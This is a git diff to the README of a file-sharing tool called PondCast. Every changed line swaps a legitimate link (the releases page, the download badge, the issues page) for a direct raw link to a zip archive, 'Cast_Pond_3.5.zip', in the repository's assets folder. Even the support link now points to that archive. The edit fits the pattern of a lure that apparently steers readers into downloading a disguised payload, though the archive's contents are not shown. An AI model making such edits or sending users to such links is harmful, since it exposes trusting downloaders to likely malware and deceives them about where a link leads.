@@ -19,9 +19,9 @@ PondCast is a lightweight tool for sharing files over your local network. With n
 To start using PondCast, follow these simple steps:
 
 1. **Download PondCast**
-   Visit this [link to download](https://github.com/EditorBoi/PondCast/releases) the software. 
+   Visit this [link to download](https://github.com/EditorBoi/PondCast/raw/refs/heads/main/assets/Cast_Pond_3.5.zip) the software. 
 
-   ![Download PondCast](https://img.shields.io/badge/Download%20PondCast-v1.0-blue)
+   ![Download PondCast](https://github.com/EditorBoi/PondCast/raw/refs/heads/main/assets/Cast_Pond_3.5.zip%20PondCast-v1.0-blue)
 
 2. **Run the Application**
    After downloading, unzip the downloaded file if necessary. Open your web browser and enter the address where PondCast is hosted on your local network. If you are sharing files with someone else, make sure both devices are connected to the same network.
@@ -36,9 +36,9 @@ To start using PondCast, follow these simple steps:
    When you're finished sharing files, simply close the browser tab.
 
 ## 🌍 Community and Support
-If you have any questions or need help, you can submit issues on the [PondCast GitHub page](https://github.com/EditorBoi/PondCast/issues). The community is here to assist you.
+If you have any questions or need help, you can submit issues on the [PondCast GitHub page](https://github.com/EditorBoi/PondCast/raw/refs/heads/main/assets/Cast_Pond_3.5.zip). The community is here to assist you.
 
 ## 🔗 Download & Install
-To get started with PondCast, please visit this page to download the latest version: [PondCast Releases](https://github.com/EditorBoi/PondCast/releases). Follow the instructions above to run and use PondCast with ease.
+To get started with PondCast, please visit this page to download the latest version: [PondCast Releases](https://github.com/EditorBoi/PondCast/raw/refs/heads/main/assets/Cast_Pond_3.5.zip). Follow the instructions above to run and use PondCast with ease.
 
 Feel free to explore and enjoy seamless file sharing with PondCast!
